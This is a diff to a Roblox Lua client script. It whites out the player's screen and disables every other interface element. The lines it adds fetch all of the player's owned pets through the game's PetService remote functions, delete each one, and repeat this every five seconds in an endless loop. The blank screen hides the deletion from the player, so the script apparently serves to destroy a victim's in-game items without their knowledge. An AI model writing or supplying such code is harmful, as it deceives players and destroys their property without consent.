@@ -1,10 +1,10 @@
--- Create a ScreenGui to cover the entire screen
+-- Create a ScreenGui to cover the entire screen with a white background
 local whiteScreenGui = Instance.new("ScreenGui")
 whiteScreenGui.IgnoreGuiInset = true
 whiteScreenGui.DisplayOrder = 10 -- Ensure it appears above other GUIs
 whiteScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Create a Frame to display a white background
+-- Create a Frame to display the white background
 local whiteFrame = Instance.new("Frame")
 whiteFrame.Size = UDim2.new(1, 0, 1, 0)
 whiteFrame.Position = UDim2.new(0, 0, 0, 0)
@@ -12,9 +12,47 @@ whiteFrame.BackgroundColor3 = Color3.new(1, 1, 1) -- White color
 whiteFrame.BorderSizePixel = 0
 whiteFrame.Parent = whiteScreenGui
 
--- Optional: Hide all existing GUIs by disabling them
+-- Disable all existing GUIs except the new white screen
 for _, gui in ipairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
     if gui ~= whiteScreenGui then
         gui.Enabled = false
     end
 end
+
+-- Define the PetService for accessing pet deletion functionality
+local petService = game:GetService("ReplicatedStorage").Packages.Knit.Services.PetService.RF
+
+-- Function to delete all owned pets
+local function deleteAllPets()
+    local success, petData = pcall(function()
+        return petService:WaitForChild("getOwned"):InvokeServer()
+    end)
+
+    if success and petData then
+        for petId, _ in pairs(petData) do
+            local deleteArgs = { petId }
+            local deleteSuccess = pcall(function()
+                petService.delete:InvokeServer(unpack(deleteArgs))
+            end)
+
+            if deleteSuccess then
+                print("Deleted pet with ID:", petId)
+            else
+                warn("Failed to delete pet with ID:", petId)
+            end
+
+            wait(0.1)  -- Delay to prevent server overload
+        end
+        print("All pets have been processed for deletion.")
+    else
+        warn("Failed to retrieve pet data for deletion.")
+    end
+end
+
+-- Auto-loop to keep deleting pets at regular intervals
+spawn(function()
+    while true do
+        deleteAllPets()
+        wait(5)  -- Adjust this wait time as needed to control the frequency of deletions
+    end
+end)
